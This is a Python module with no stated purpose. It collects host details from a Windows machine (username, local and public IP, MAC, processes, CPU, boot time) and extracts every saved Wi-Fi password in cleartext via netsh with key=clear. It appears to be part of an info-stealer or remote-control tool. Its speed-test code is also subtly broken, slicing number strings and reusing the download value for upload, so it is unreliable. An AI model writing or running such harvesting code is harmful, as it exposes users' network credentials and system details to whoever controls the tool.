import psutil
import platform
import socket
import getpass
import requests
from datetime import datetime
from uuid import getnode as get_mac
from speedtest import Speedtest
from subprocess import Popen, PIPE, check_output


class GetInfo:
    def __init__(self):
        pass

    @staticmethod
    def get_pc_info() -> str:
        username = getpass.getuser()
        ip = socket.gethostbyname(socket.gethostname())
        pub_ip = requests.get('https://api.ipify.org').text
        mac = get_mac()
        os_info = platform.uname()
        zone = psutil.boot_time()
        os_time = datetime.fromtimestamp(zone)
        cpu_data = psutil.cpu_freq()

        result = (f"Username: {username}\n"
                  f"local IP address: {ip}\n"
                  # todo get more information about public IP
                  f"public IP address: {pub_ip}\n"
                  f"MAC address: {mac}\n"
                  f"Timezone: {os_time.year}/{os_time.month}/{os_time.day}"
                  f" {os_time.hour}:{os_time.minute}:{os_time.second}\n"
                  f"Operating System: {os_info.system}\n"
                  f"Processor: {os_info.processor}\n"
                  f"Max Frequency: {cpu_data.max:.2f} Mhz\n"
                  f"Min Frequency: {cpu_data.min:.2f} Mhz\n"
                  f"Current Frequency: {cpu_data.current:.2f} Mhz\n")

        return result

    @staticmethod
    def get_connection_info() -> str:
        start = datetime.now()
        inet = Speedtest()

        download_speed = float(f"{str(inet.download())[0:2]}.{str(round(inet.download(), 2))[1]}") * 0.125
        upload_speed = float(f"{str(inet.upload())[0:2]}.{str(round(inet.download(), 2))[1]}") * 0.125

        ends = datetime.now()
        work_speed = format(ends - start)

        result = (f"Work speed: {work_speed}\n"
                  f"Download: {download_speed} MB/s\n"
                  f"Upload: {upload_speed} MB/s\n")

        return result

    @staticmethod
    def get_process() -> str:
        return ' '.join([line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()])

    @staticmethod
    # todo for ru and en version
    def get_wifi_info() -> str:
        passwords = []
        data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
        wifi_list = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
        for wifi in wifi_list:
            results = check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
            results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
            try:
                passwords.append(f'Имя сети: {wifi}, Пароль: {results[0]}')
            except IndexError:
                passwords.append(f'Имя сети: {wifi}, Пароль не найден!')
        return "\n".join(passwords)
